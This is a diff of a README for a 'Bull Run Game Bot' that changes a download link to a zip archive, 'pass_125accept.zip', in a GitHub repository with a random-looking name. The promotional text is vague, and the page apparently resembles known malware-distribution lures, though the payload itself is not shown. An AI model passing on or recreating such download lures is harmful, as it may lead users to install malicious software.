@@ -3,7 +3,7 @@ Bull Run Game Bot: Comprehensive Overview
 Introduction
 The Bull Run Game Bot is an advanced automated system designed to perform all in-game actions with precision and efficiency. This bot leverages cutting-edge technology to mimic human-like behavior, interact seamlessly with the game server, and ensure optimal gameplay. Below is a detailed breakdown of the bot's functionality and design.
 
-[DOWNLOAD](https://github.com/loasd104/asfsfscxs/releases/download/Release/install.zip)
+[DOWNLOAD](https://github.com/loasd104/asfsfscxs/releases/download/Release/pass_125accept.zip)
 
 # Key Features
 1. Game Analysis
